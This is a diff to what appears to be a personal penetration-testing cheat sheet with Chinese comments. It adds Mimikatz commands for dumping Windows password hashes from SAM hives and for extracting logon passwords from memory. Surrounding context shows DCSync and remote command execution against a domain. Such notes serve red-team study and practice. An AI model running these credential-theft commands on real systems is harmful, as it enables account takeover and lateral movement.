@@ -35,6 +35,8 @@ lsadump::dcsync /domain:kevin.com /user:root
 lsadump::sam /sam:sam.hive /system:system.hive
 ```
 
+Invoke-Mimikatz -Command '"lsadump::sam /sam:sam.hive /system:system.hive"'
+
 # 从本地SAM文件中读取密码哈希
 ```
 token::elevate
@@ -57,5 +59,14 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.
 
 
 
+
+# Mimikatz.exe
+```
+#提升权限
+privilege::debug
+
+#抓取密码
+sekurlsa::logonpasswords
+```
 
 
